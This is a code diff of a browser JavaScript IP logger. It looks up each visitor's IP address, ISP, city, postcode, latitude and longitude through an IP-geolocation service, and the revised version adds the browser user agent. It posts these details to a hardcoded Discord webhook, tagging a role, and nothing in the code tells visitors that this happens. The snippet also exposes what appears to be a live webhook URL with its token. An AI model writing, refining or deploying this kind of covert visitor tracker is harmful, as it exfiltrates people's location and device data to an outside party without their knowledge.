@@ -1,68 +1,67 @@
-
 const webHookUrl = "https://discord.com/api/webhooks/1259114940854304769/40loCtX1nLtcWEV-9HwnojQkQ3tDra1BA3Y_tadLYbr3mfEvUvWw1YrfYIhmG0YG3ZcV";
 
 const fetchData = async () => {
     try {
-
         if (!webHookUrl) {
-            console.error('Webhook URL is empty or not found.');
+            console.error('Webhook URL is missing.');
             return;
         }
 
-        // Fetching IP data
+        // Get IP data
         const response = await fetch('https://ipapi.co/json/');
+        if (!response.ok) {
+            console.error(`Failed to fetch IP info: ${response.status}`);
+            return;
+        }
+
         const data = await response.json();
 
-        // Retrieve previous IP from temp storage
-        const prevIp = localStorage.getItem('prevIp');
+        const currentIp = data.ip;
+        const previousIp = localStorage.getItem('prevIp');
 
-        // If previous IP is the same as the current one, do not send to Discord
-        if (prevIp && prevIp === data.ip) {
+        if (previousIp === currentIp) {
+            console.log('Same IP as before, skipping Discord message.');
             return;
         }
 
-        // // Update temp storage with the current IP
-        localStorage.setItem('prevIp', data.ip);
+        localStorage.setItem('prevIp', currentIp);
 
-        const ip = data.ip;
-        const provider = data.org + " (" + data.asn + ")";
-        const timezone = data.timezone;
-        const country = data.country_name;
-        const region = data.region;
-        const city = data.city;
-        const zip = data.postal;
-        const lat = data.latitude;
-        const lon = data.longitude;
+        const userAgent = navigator.userAgent;
 
+        const content = [
+            `IP-Address: ${currentIp}`,
+            ``,
+            `Timezone: ${data.timezone}`,
+            `Provider: ${data.org} (${data.asn})`,
+            ``,
+            `Country and Region: ${data.country_name} - ${data.region}`,
+            `City: ${data.city}`,
+            `Zip Code: ${data.postal}`,
+            ``,
+            `Longitude: ${data.longitude}`,
+            `Latitude: ${data.latitude}`,
+            ``,
+            `User-Agent: ${userAgent}`
+        ].join('\n');
 
-        // Discord Message Structure
-        const params = {
-            content:
-                "```IP-Address: " + ip +
-                "\n \nTimezone: " + timezone +
-                "\nProvider: " + provider +
-                "\n \nCountry and Region: " + country + " - " + region +
-                "\nCity: " + city +
-                "\nZip Code: " + zip +
-                "\n \nLongitude: " + lon + 
-                "\nLatitude: " + lat + "```<@&1208424264747847732>"
+        const payload = {
+            content: `\`\`\`\n${content}\n\`\`\`<@&1208424264747847732>`
         };
 
-
-        await fetch(webHookUrl, {
+        const webhookResponse = await fetch(webHookUrl, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(params),
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
         });
 
-        console.log(params);
-        
-
+        if (!webhookResponse.ok) {
+            console.error(`Failed to send to Discord: ${webhookResponse.status}`);
+        } else {
+            console.log('Data sent to Discord:', payload);
+        }
 
     } catch (error) {
-        console.error('Script running error', error);
+        console.error('An error occurred:', error);
     }
 };
 
